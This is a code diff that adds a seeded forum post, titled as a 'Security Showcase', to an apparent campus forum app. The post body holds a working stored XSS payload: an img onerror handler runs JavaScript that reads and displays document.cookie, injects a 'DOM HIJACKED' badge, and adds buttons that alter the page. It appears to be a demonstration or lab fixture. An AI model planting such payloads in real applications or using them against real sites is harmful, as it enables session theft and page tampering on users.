@@ -113,6 +113,75 @@ function seedData(db) {
     'We are evaluating different backend frameworks for campus intranet services. Please share your suggestions regarding performance, memory overhead, and ease of maintenance.'
   );
 
+  insertPost.run(
+    dhannuId,
+    'Security Showcase: Interactive DOM Manipulation and Session Audit',
+    'Announcements',
+    `<div id="xssControlPanel" style="background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); border: 2px solid #ef4444; border-radius: 12px; padding: 22px; margin: 16px 0; color: #f8fafc; box-shadow: 0 10px 25px rgba(239, 68, 68, 0.25);">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; border-bottom: 1px solid #334155; padding-bottom: 10px;">
+        <span style="background: #ef4444; color: #ffffff; padding: 4px 10px; border-radius: 9999px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em;">Stored XSS Active</span>
+        <span style="font-size: 12px; color: #94a3b8;">DOM &amp; Session Execution Context</span>
+      </div>
+      <h3 style="margin: 0 0 8px 0; font-size: 1.2rem; color: #f8fafc;">Interactive Session &amp; Interface Takeover</h3>
+      <p style="margin: 0 0 14px 0; font-size: 0.88rem; color: #cbd5e1; line-height: 1.5;">This demonstration confirms unhindered client-side script execution. The injected code below accesses browser storage, intercepts DOM elements, and manipulates forum styles in real time.</p>
+      
+      <div style="background: rgba(15, 23, 42, 0.85); border: 1px solid #334155; border-radius: 8px; padding: 12px; margin-bottom: 16px; font-family: monospace; font-size: 0.82rem;">
+        <div style="color: #38bdf8; margin-bottom: 4px; font-weight: 600;">Extracted Session State:</div>
+        <div id="xssDumpTarget" style="color: #e2e8f0; word-break: break-all;">[Accessing ambient cookies...]</div>
+      </div>
+
+      <div style="display: flex; flex-wrap: wrap; gap: 10px;">
+        <button id="xssInvertBtn" class="btn btn-sm btn-danger" style="font-size: 0.8rem; cursor: pointer;">
+          Toggle Theme Inversion
+        </button>
+        <button id="xssToastBtn" class="btn btn-sm btn-outline-blue" style="font-size: 0.8rem; background: #334155; color: #ffffff; border-color: #475569; cursor: pointer;">
+          Spawn Injected Alert Toast
+        </button>
+        <button id="xssResetBtn" class="btn btn-sm btn-outline-blue" style="font-size: 0.8rem; cursor: pointer;">
+          Reset Interface Changes
+        </button>
+      </div>
+    </div>
+    <img src="invalid" onerror="(function(){
+      var target = document.getElementById('xssDumpTarget');
+      if (target) {
+        target.innerText = document.cookie || 'No client-accessible cookies found (or HttpOnly enforced)';
+      }
+      var brand = document.querySelector('.brand-title');
+      if (brand && !document.getElementById('xssTamperBadge')) {
+        var badge = document.createElement('span');
+        badge.id = 'xssTamperBadge';
+        badge.style = 'background: #ef4444; color: #ffffff; font-size: 0.65rem; padding: 2px 8px; border-radius: 9999px; margin-left: 10px; vertical-align: middle; font-weight: 700; text-transform: uppercase; box-shadow: 0 0 10px rgba(239, 68, 68, 0.6); animation: pulse 1.5s infinite;';
+        badge.innerText = 'DOM HIJACKED BY XSS';
+        brand.appendChild(badge);
+      }
+      var invertBtn = document.getElementById('xssInvertBtn');
+      if (invertBtn) {
+        invertBtn.onclick = function() {
+          document.body.style.filter = document.body.style.filter ? '' : 'invert(0.9) hue-rotate(180deg)';
+        };
+      }
+      var toastBtn = document.getElementById('xssToastBtn');
+      if (toastBtn) {
+        toastBtn.onclick = function() {
+          var toast = document.createElement('div');
+          toast.style = 'position: fixed; top: 24px; right: 24px; z-index: 99999; background: #ef4444; color: #ffffff; padding: 14px 22px; border-radius: 8px; font-weight: 700; font-size: 0.9rem; box-shadow: 0 10px 25px rgba(0,0,0,0.4); border: 1px solid #fca5a5;';
+          toast.innerText = 'Security Notice: Arbitrary JavaScript executing in victim session!';
+          document.body.appendChild(toast);
+          setTimeout(function() { toast.remove(); }, 4000);
+        };
+      }
+      var resetBtn = document.getElementById('xssResetBtn');
+      if (resetBtn) {
+        resetBtn.onclick = function() {
+          document.body.style.filter = '';
+          var b = document.getElementById('xssTamperBadge');
+          if (b) b.remove();
+        };
+      }
+    })()" style="display:none;" />`
+  );
+
   const post1Id = db.prepare('SELECT id FROM posts WHERE user_id = ?').get(mridankanId).id;
   const post3Id = db.prepare('SELECT id FROM posts WHERE user_id = ?').get(dhannuId).id;
 
